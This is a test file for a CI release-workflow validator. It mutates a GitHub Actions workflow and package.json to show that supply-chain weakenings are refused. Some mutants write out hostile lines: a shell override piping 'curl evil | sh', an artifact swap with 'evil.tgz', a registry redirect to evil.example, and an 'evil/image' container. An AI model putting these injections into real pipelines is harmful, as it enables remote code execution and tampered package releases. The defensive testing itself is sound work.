import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { validateReleaseWorkflow } from '../scripts/check-release-workflow.js';
import { validateReleaseContext } from '../scripts/prepare-release.js';

const read = (path) => readFileSync(fileURLToPath(new URL('../' + path, import.meta.url)), 'utf8').replace(/\r\n/g, '\n');
const workflow = read('.github/workflows/release.yml');
const pkg = JSON.parse(read('package.json'));
const policy = read('docs/releasing.md');
const tag = pkg.name + '@' + pkg.version;
const context = {
	GITHUB_EVENT_NAME: 'push',
	GITHUB_REF_TYPE: 'tag',
	GITHUB_REF_NAME: tag,
	GITHUB_REF: 'refs/tags/' + tag,
	GITHUB_REPOSITORY: 'lanteanio/svelte-realtime',
	GITHUB_SHA: 'a'.repeat(40)
};
const git = {
	tagType: 'tag',
	tagCommit: 'b'.repeat(40),
	// The event SHA of an annotated tag push is the tag OBJECT, not the
	// commit it points at; the validator binds GITHUB_SHA to one of the two.
	tagObject: 'a'.repeat(40),
	head: 'b'.repeat(40),
	clean: true,
	sourceBranch: 'origin/dev',
	sourceContainsHead: true
};

describe('trusted release workflow', () => {
	it('refuses malformed documents, missing final identity checks and canceled releases', () => {
		for (const source of ['', 'null', '[]', 'text']) expect(validateReleaseWorkflow(source, pkg, policy)).not.toEqual([]);
		const missingFinalCheck = workflow.replace('      - name: Verify retained source identity\n        run: node scripts/prepare-release.js\n\n', '');
		expect(missingFinalCheck).not.toBe(workflow);
		expect(validateReleaseWorkflow(missingFinalCheck, pkg, policy).join('\n')).toContain('exactly, in order');
		expect(validateReleaseWorkflow(workflow.replace('cancel-in-progress: false', 'cancel-in-progress: true'), pkg, policy).join('\n')).toContain('release concurrency');
	});
	it('is a closed tag-only OIDC path for one retained tarball', () => {
		expect(validateReleaseWorkflow(workflow, pkg, policy)).toEqual([]);
	});

	it('rejects trigger, permission, token, and source-publication widening', () => {
		const mutants = [
			workflow.replace("tags:\n      - 'svelte-realtime@*'", 'branches: [main]'),
			// Anchored on the permissions block, not the bare token: the
			// workflow header discusses `id-token: write` in prose, and a
			// first-occurrence replace would mutate the comment instead.
			workflow.replace('      contents: read\n      id-token: write', '      contents: read\n      id-token: read'),
			workflow.replace('npm publish "', 'NODE_AUTH_TOKEN: secret\n        run: npm publish "'),
			workflow.replace('${{ steps.pack.outputs.tarball }}', '.')
		];
		for (const [index, mutant] of mutants.entries()) {
			// A mutant that did not change the source proves nothing: the
			// assertion below would pass on an unmutated workflow only if the
			// gate were broken, but a NO-OP replace makes it pass silently.
			expect(mutant, 'mutant ' + index + ' did not change the workflow').not.toBe(workflow);
			expect(validateReleaseWorkflow(mutant, pkg, policy).length, 'mutant ' + index).toBeGreaterThan(0);
		}
	});

	it('rejects any script name outside the closed inventory, additions and removals alike', () => {
		// npm pack runs prepack, prepare, and postpack AFTER the verify job's
		// explicit checks, and npm run executes the pre/post companions of
		// every script it runs - so a postprepublishOnly lands between the
		// last check and the hash, and no blocklist can enumerate that name
		// space. The scripts object is therefore a closed inventory.
		const added = ['prepublish', 'prepack', 'prepare', 'postpack',
			'postprepublishOnly', 'postcheck', 'precheck', 'postverify:pr'];
		for (const hook of added) {
			const mutant = { ...pkg, scripts: { ...pkg.scripts, [hook]: 'node rewrite.js' } };
			const failures = validateReleaseWorkflow(workflow, mutant, policy);
			expect(failures.some((e) => e.includes(hook)), hook + ' was accepted').toBe(true);
		}
		// Presence, not content: an innocent-looking script is the same hole,
		// because the gate cannot judge what a script does.
		const benign = { ...pkg, scripts: { ...pkg.scripts, prepare: 'echo ready' } };
		expect(validateReleaseWorkflow(workflow, benign, policy).length).toBeGreaterThan(0);
		// A removal is refused too: the release path runs several scripts by
		// name, and losing one silently would fail in the middle of a tag
		// build instead of here.
		const { check, ...withoutCheck } = pkg.scripts;
		const removed = { ...pkg, scripts: withoutCheck };
		expect(validateReleaseWorkflow(workflow, removed, policy)
			.some((e) => e.includes('missing') && e.includes('check'))).toBe(true);
	});

	it('rejects an edited body on an allowed script, the other half of the surface', () => {
		// The name inventory closes what npm can be made to RUN; the body pins
		// close what the allowed names DO. Without them, one edit turns a
		// check the workflow claims to run into any of the weakenings below
		// while every name pin stays green.
		const weakenings = [
			['check', 'echo ok'],
			['prepublishOnly', 'true'],
			['verify:pr', 'npm run verify:sim'],
			['test', 'vitest run test/env.test.js'],
			['verify:release', 'npm test']
		];
		for (const [name, body] of weakenings) {
			expect(pkg.scripts[name], name + ' must exist and differ from the weakening').not.toBe(body);
			const mutant = { ...pkg, scripts: { ...pkg.scripts, [name]: body } };
			const failures = validateReleaseWorkflow(workflow, mutant, policy);
			expect(failures.some((e) => e.includes('"' + name + '"') && e.includes('pinned body')),
				name + ' body edit was accepted').toBe(true);
		}
		// The refusal states the protocol, so the repair is in the message:
		// the pin moves in the same change, where the gate's diff shows what
		// the release path will now run.
		const mutant = { ...pkg, scripts: { ...pkg.scripts, check: 'echo ok' } };
		expect(validateReleaseWorkflow(workflow, mutant, policy)
			.some((e) => e.includes('must move the pin'))).toBe(true);
	});

	it('rejects action-tag drift and artifact-output laundering', () => {
		const floating = workflow.replace(
			'actions/checkout@11d5960a326750d5838078e36cf38b85af677262',
			'actions/checkout@v4'
		);
		expect(validateReleaseWorkflow(floating, pkg, policy).length).toBeGreaterThan(0);
		const laundered = workflow.replace(
			"'tarball=' + $tarball >> $env:GITHUB_OUTPUT",
			"'tarball=package.json' >> $env:GITHUB_OUTPUT"
		);
		expect(validateReleaseWorkflow(laundered, pkg, policy).length).toBeGreaterThan(0);

		// An INTERIOR line added to the pack body - no new step, no renamed
		// step - swaps the tarball bytes after the checks ran. The body is
		// exact-matched, so the injection must fail even though every required
		// token is still present.
		const injected = workflow.replace(
			"'tarball=' + $tarball >> $env:GITHUB_OUTPUT",
			"Copy-Item evil.tgz $tarball -Force\n          'tarball=' + $tarball >> $env:GITHUB_OUTPUT"
		);
		expect(injected).not.toBe(workflow);
		expect(validateReleaseWorkflow(injected, pkg, policy).join('\n'))
			.toContain('"Pack retained artifact" has a non-exact run');
	});

	it('keeps the publication identity out of the job that installs and tests', () => {
		// id-token: write is granted PER JOB. If the job that runs npm ci and
		// the suite can also mint an OIDC token, every third-party lifecycle
		// script in the tree can publish. The split is the control; this is the
		// mutation that silently undoes it.
		const armedVerify = workflow.replace(
			'    permissions:\n      contents: read\n    outputs:',
			'    permissions:\n      contents: read\n      id-token: write\n    outputs:'
		);
		expect(armedVerify).not.toBe(workflow);
		expect(validateReleaseWorkflow(armedVerify, pkg, policy).join('\n'))
			.toContain('verify job permissions must be exactly contents read');

		// The other direction: the publish job growing an install step is how
		// repository and dependency code re-enters the credential-bearing job.
		const installingPublish = workflow.replace(
			'      - name: Download the retained publication artifact',
			'      - name: Install locked root dependencies\n        run: npm ci\n\n      - name: Download the retained publication artifact'
		);
		expect(installingPublish).not.toBe(workflow);
		expect(validateReleaseWorkflow(installingPublish, pkg, policy).join('\n'))
			.toContain('publish job steps must be exactly, in order');

		// Dropping the dependency lets publish race verify and publish an
		// artifact no gate ever produced.
		const detached = workflow.replace('    needs: verify\n', '');
		expect(detached).not.toBe(workflow);
		expect(validateReleaseWorkflow(detached, pkg, policy).join('\n'))
			.toContain('publish job must depend on the verify job');

		// Collapsing back to one job is the whole regression in one edit.
		const merged = workflow.replace('  verify:\n', '  release:\n');
		expect(merged).not.toBe(workflow);
		expect(validateReleaseWorkflow(merged, pkg, policy).join('\n'))
			.toContain('exactly the verify and publish jobs');
	});

	it('rejects a shell override, which replaces the interpreter of an exact-matched command', () => {
		// `shell:` is a command TEMPLATE, not a name: `bash -c "<attacker> {0}"`
		// runs arbitrary code and then the pinned body, leaving the name, the
		// order and the body untouched. Only the pack step may carry one.
		const hijacked = workflow.replace(
			'      - name: Publish exact tarball to quarantine with trusted OIDC\n        run: npm publish',
			'      - name: Publish exact tarball to quarantine with trusted OIDC\n        shell: bash -c "curl evil | sh; {0}"\n        run: npm publish'
		);
		expect(hijacked).not.toBe(workflow);
		expect(validateReleaseWorkflow(hijacked, pkg, policy).join('\n'))
			.toContain('carries disallowed keys: shell');

		const idAdded = workflow.replace(
			'      - name: Install locked root dependencies\n        run: npm ci',
			'      - name: Install locked root dependencies\n        id: pack\n        run: npm ci'
		);
		expect(idAdded).not.toBe(workflow);
		expect(validateReleaseWorkflow(idAdded, pkg, policy).join('\n'))
			.toContain('carries disallowed keys: id');

		// The pack step's own shell is pinned to its value, not merely allowed.
		const packShell = workflow.replace('        shell: pwsh\n', '        shell: bash\n');
		expect(packShell).not.toBe(workflow);
		expect(validateReleaseWorkflow(packShell, pkg, policy).join('\n'))
			.toContain('has a non-exact shell');
	});

	it('rejects step-level keys that neutralize a step without touching name, order, or body', () => {
		// continue-on-error makes the identity verifier ADVISORY: it runs,
		// refuses, and the job publishes anyway. The load-bearing case.
		const advisory = workflow.replace(
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        continue-on-error: true\n        run: node scripts/prepare-release.js'
		);
		expect(advisory).not.toBe(workflow);
		expect(validateReleaseWorkflow(advisory, pkg, policy).join('\n'))
			.toContain('disallowed keys: continue-on-error');

		const skipped = workflow.replace(
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        if: ${{ false }}\n        run: node scripts/prepare-release.js'
		);
		expect(skipped).not.toBe(workflow);
		expect(validateReleaseWorkflow(skipped, pkg, policy).join('\n'))
			.toContain('disallowed keys: if');

		const preloaded = workflow.replace(
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        env:\n          NODE_OPTIONS: --require ./scripts/postinstall.js\n        run: node scripts/prepare-release.js'
		);
		expect(preloaded).not.toBe(workflow);
		expect(validateReleaseWorkflow(preloaded, pkg, policy).join('\n'))
			.toContain('disallowed keys: env');
	});

	it('rejects trigger-filter widening that re-admits branch pushes', () => {
		// Defining only `tags` is what keeps branch events out. Adding
		// branches-ignore re-admits every branch not listed, so the job runs
		// npm ci - executing that branch's lifecycle scripts - inside the
		// protected environment with id-token: write, before the verifier.
		const readmitted = workflow.replace(
			"    tags:\n      - 'svelte-realtime@*'",
			"    tags:\n      - 'svelte-realtime@*'\n    branches-ignore:\n      - 'no-such-branch'"
		);
		expect(readmitted).not.toBe(workflow);
		expect(validateReleaseWorkflow(readmitted, pkg, policy).join('\n'))
			.toContain('push trigger must carry exactly the tags filter');

		for (const widening of ['    tags-ignore:\n      - \'v*\'', "    paths:\n      - '**'"]) {
			const mutant = workflow.replace(
				"    tags:\n      - 'svelte-realtime@*'",
				"    tags:\n      - 'svelte-realtime@*'\n" + widening
			);
			expect(mutant).not.toBe(workflow);
			expect(validateReleaseWorkflow(mutant, pkg, policy).join('\n'), widening)
				.toContain('push trigger must carry exactly the tags filter');
		}
	});

	it('rejects job-level and workflow-level laundering keys the step inventory cannot see', () => {
		// A job-level env is inherited by EVERY exact-matched run command -
		// the step-level attack moved one indent up. The lead case.
		const jobEnv = workflow.replace(
			'    timeout-minutes: 90',
			'    timeout-minutes: 90\n    env:\n      NODE_OPTIONS: --require ./scripts/postinstall.js'
		);
		expect(jobEnv).not.toBe(workflow);
		expect(validateReleaseWorkflow(jobEnv, pkg, policy).join('\n'))
			.toContain('verify job key inventory is not exact');

		const jobShell = workflow.replace(
			'    timeout-minutes: 90',
			'    timeout-minutes: 90\n    defaults:\n      run:\n        shell: bash -c "curl evil | sh; {0}"'
		);
		expect(jobShell).not.toBe(workflow);
		expect(validateReleaseWorkflow(jobShell, pkg, policy).join('\n'))
			.toContain('verify job key inventory is not exact');

		const jobContainer = workflow.replace(
			'    timeout-minutes: 90',
			'    timeout-minutes: 90\n    container: evil/image:latest'
		);
		expect(jobContainer).not.toBe(workflow);
		expect(validateReleaseWorkflow(jobContainer, pkg, policy).join('\n'))
			.toContain('verify job key inventory is not exact');

		const workflowEnv = workflow.replace(
			'permissions:\n  contents: read',
			'permissions:\n  contents: read\nenv:\n  npm_config_registry: https://evil.example'
		);
		expect(workflowEnv).not.toBe(workflow);
		expect(validateReleaseWorkflow(workflowEnv, pkg, policy).join('\n'))
			.toContain('release workflow key inventory is not exact');
	});

	it('rejects an interposed step, a duplicated step name, and verify-before-install', () => {
		// An extra run step between pack and publish is exactly where an
		// artifact swap would live; the checker holds a closed, ordered
		// step inventory rather than a name-keyed set.
		const interposed = workflow.replace(
			'      - name: Publish exact tarball to quarantine with trusted OIDC',
			'      - name: Innocuous cleanup\n        run: echo done\n\n      - name: Publish exact tarball to quarantine with trusted OIDC'
		);
		expect(interposed).not.toBe(workflow);
		expect(validateReleaseWorkflow(interposed, pkg, policy).join('\n')).toContain('exactly, in order');

		const duplicated = workflow.replace(
			'      - name: Install OIDC-capable npm\n        run: npm install --global npm@11.8.0',
			'      - name: Install OIDC-capable npm\n        run: echo shadowed\n\n      - name: Install OIDC-capable npm\n        run: npm install --global npm@11.8.0'
		);
		expect(duplicated).not.toBe(workflow);
		expect(validateReleaseWorkflow(duplicated, pkg, policy).join('\n')).toContain('exactly, in order');

		// The verifier imports installed dependencies at module load, so it
		// must run after npm ci - the previous order killed every tag push.
		const verifyFirst = workflow.replace(
			'      - name: Install locked root dependencies\n        run: npm ci\n\n      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js',
			'      - name: Verify tag, package, and source identity\n        run: node scripts/prepare-release.js\n\n      - name: Install locked root dependencies\n        run: npm ci'
		);
		expect(verifyFirst).not.toBe(workflow);
		expect(validateReleaseWorkflow(verifyFirst, pkg, policy).join('\n')).toContain('exactly, in order');
	});

	// The structural mutations below prove the comparison cannot be REMOVED. This
	// proves it WORKS, by running the step's own script text - lifted out of the
	// workflow rather than retyped, so the two cannot drift - against real files.
	// A comparison that is present but wrong satisfies every structural check.
	//
	// Skipped only where no PowerShell exists. GitHub's Ubuntu and Windows
	// runners both ship one, so the hosted gate always executes this.
	it('refuses, as a real process, any bytes that are not the verified ones', async () => {
		const { spawnSync } = await import('node:child_process');
		const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
		const { tmpdir } = await import('node:os');
		const { join } = await import('node:path');
		const { createHash } = await import('node:crypto');
		const { parse } = await import('yaml');

		const shell = ['pwsh', 'powershell'].find((bin) => {
			try {
				return spawnSync(bin, ['-NoProfile', '-Command', 'exit 0'], { stdio: 'ignore' }).status === 0;
			} catch { return false; }
		});
		if (!shell) {
			console.warn('[release-workflow] no PowerShell interpreter; digest execution not verified here');
			return;
		}

		const step = parse(workflow).jobs.publish.steps
			.find((entry) => entry.name === 'Refuse to publish anything but the verified bytes');
		expect(step?.run, 'the digest comparison step is gone').toBeTruthy();

		const filename = 'svelte-realtime-0.0.0-probe.tgz';
		// Passed as -Command rather than written to a .ps1 and run with -File:
		// Windows blocks script FILES under the default execution policy, which
		// would have made every case below exit non-zero and turned the tamper
		// assertions green for a reason that has nothing to do with the digest.
		const gate = (bytes, expectedDigest) => {
			const dir = mkdtempSync(join(tmpdir(), 'adapter-uws-digest-'));
			mkdirSync(join(dir, 'release-artifacts'), { recursive: true });
			writeFileSync(join(dir, 'release-artifacts', filename), bytes);
			const script = step.run
				.replaceAll('${{ needs.verify.outputs.sha256 }}', expectedDigest)
				.replaceAll('${{ needs.verify.outputs.filename }}', filename);
			return spawnSync(shell, ['-NoProfile', '-Command', script], { cwd: dir, encoding: 'utf8' });
		};

		const verified = Buffer.from('the bytes the verify job packed');
		const digest = createHash('sha256').update(verified).digest('hex');

		expect(gate(verified, digest).status, 'the verified bytes were refused').toBe(0);
		// One flipped byte is the entire attack.
		expect(gate(Buffer.from('the bytes the verify job packeD'), digest).status).not.toBe(0);
		expect(gate(Buffer.concat([verified, Buffer.from('x')]), digest).status).not.toBe(0);
		// A verify job that produced no digest must not be publishable either,
		// or removing the digest becomes the way around the comparison.
		expect(gate(verified, '').status).not.toBe(0);
	}, 60_000);

	it('cannot lose the digest boundary between the two jobs', () => {
		// The two-job split keeps the publication identity away from npm ci and
		// the suite. The artifact handed between them is where the verified bytes
		// leave this workflow's control, and download-artifact's own digest check
		// only WARNS on a mismatch - the job continues and publishes. Each mutation
		// below is a way to be left publishing bytes nobody verified.
		const mutations = [
			// The comparison step deleted outright.
			workflow.replace(/      # download-artifact checks[\s\S]*?'verified digest ' \+ \$actual\n\n/, ''),
			// The digest no longer crosses the job boundary, so nothing can compare.
			workflow.replace('      sha256: ${{ steps.pack.outputs.sha256 }}\n', ''),
			// Never computed in the first place.
			workflow.replace(
				"          $sha256 = (Get-FileHash -LiteralPath $tarball -Algorithm SHA256).Hash.ToLowerInvariant()\n",
				''
			),
			// The comparison inverted - passes precisely when the bytes differ.
			workflow.replace(
				"if ($actual -ne $expected) { throw 'downloaded tarball is not the verified artifact' }",
				"if ($actual -eq $expected) { throw 'downloaded tarball is not the verified artifact' }"
			),
			// Compared, then reported instead of refused.
			workflow.replace(
				"if ($actual -ne $expected) { throw 'downloaded tarball is not the verified artifact' }",
				"if ($actual -ne $expected) { Write-Host 'digest mismatch' }"
			),
			// Compared after the publish it was supposed to guard.
			workflow.replace(
				'      - name: Refuse to publish anything but the verified bytes',
				'      - name: Publish exact tarball to quarantine with trusted OIDC\n' +
				'        run: npm publish "release-artifacts/${{ needs.verify.outputs.filename }}" --tag candidate\n\n' +
				'      - name: Refuse to publish anything but the verified bytes'
			)
		];
		for (const [index, mutated] of mutations.entries()) {
			expect(mutated, 'mutation ' + index + ' did not change the workflow').not.toBe(workflow);
			expect(
				validateReleaseWorkflow(mutated, pkg, policy).length,
				'mutation ' + index + ' was accepted'
			).toBeGreaterThan(0);
		}
	});
});

describe('release source identity', () => {
	it('requires canonical versions and the matching stable or prerelease lineage', () => {
		for (const version of ['01.2.3', '1.2.3-01', '1.2.3+build', 'v1.2.3', '1.2', '', null]) {
			expect(validateReleaseContext(context, { ...pkg, version }, git).join('\n')).toContain('canonical SemVer');
		}
		const stable = { ...pkg, version: '1.2.3', publishConfig: { tag: 'latest' } };
		const stableTag = stable.name + '@' + stable.version;
		const stableContext = { ...context, GITHUB_REF_NAME: stableTag, GITHUB_REF: 'refs/tags/' + stableTag };
		expect(validateReleaseContext(stableContext, stable, { ...git, sourceBranch: 'origin/main' })).toEqual([]);
		expect(validateReleaseContext(stableContext, stable, git).join('\n')).toContain('origin/main');
		expect(validateReleaseContext(context, { ...pkg, publishConfig: { tag: 'latest' } }, git).join('\n')).toContain('version channel');
	});
	it('accepts only the canonical annotated version tag on a clean exact commit', () => {
		expect(validateReleaseContext(context, pkg, git)).toEqual([]);
	});

	it('binds the event revision to the checkout', () => {
		// An event SHA matching neither the tag object nor the checked-out
		// HEAD means the run would publish different bytes than the push.
		expect(validateReleaseContext(
			{ ...context, GITHUB_SHA: 'd'.repeat(40) },
			pkg,
			git
		)).toContain('release event SHA is bound to neither the checked-out HEAD nor the annotated tag object');
		// Either identity is acceptable: the tag object (annotated tag push)
		// or the commit itself.
		expect(validateReleaseContext(
			{ ...context, GITHUB_SHA: 'b'.repeat(40) },
			pkg,
			git
		)).toEqual([]);
	});

	it('runs the release verifier as a real process and gets a diagnosable refusal, not a module crash', async () => {
		// The publication path once died with ERR_MODULE_NOT_FOUND before any
		// check ran, because the workflow invoked this script before npm ci.
		// Spawning it for real proves the module graph loads from a checkout
		// with dependencies installed and that a context mismatch surfaces as
		// the validator's own message.
		const { spawnSync } = await import('node:child_process');
		const result = spawnSync(process.execPath, ['scripts/prepare-release.js'], {
			cwd: fileURLToPath(new URL('..', import.meta.url)),
			encoding: 'utf8',
			windowsHide: true,
			env: { ...process.env, GITHUB_EVENT_NAME: 'pull_request', GITHUB_REF: '', GITHUB_REF_TYPE: '', GITHUB_REF_NAME: '', GITHUB_SHA: '' }
		});
		expect(result.error).toBeUndefined();
		expect(result.status).not.toBe(0);
		const output = (result.stderr || '') + (result.stdout || '');
		expect(output).toContain('release event must be push');
		expect(output).not.toContain('ERR_MODULE_NOT_FOUND');
	}, 30_000);

	it('rejects a branch, retagged package version, lightweight tag, dirty tree, or wrong commit', () => {
		const cases = [
			[{ ...context, GITHUB_REF_TYPE: 'branch' }, git],
			[{ ...context, GITHUB_REF_NAME: pkg.name + '@0.0.0' }, git],
			[context, { ...git, tagType: 'commit' }],
			[context, { ...git, clean: false }],
			[context, { ...git, tagCommit: 'c'.repeat(40) }],
			[context, { ...git, sourceContainsHead: false }],
			[context, { ...git, sourceBranch: 'origin/main' }]
		];
		for (const [env, details] of cases) {
			expect(validateReleaseContext(env, pkg, details).length).toBeGreaterThan(0);
		}
	});
});
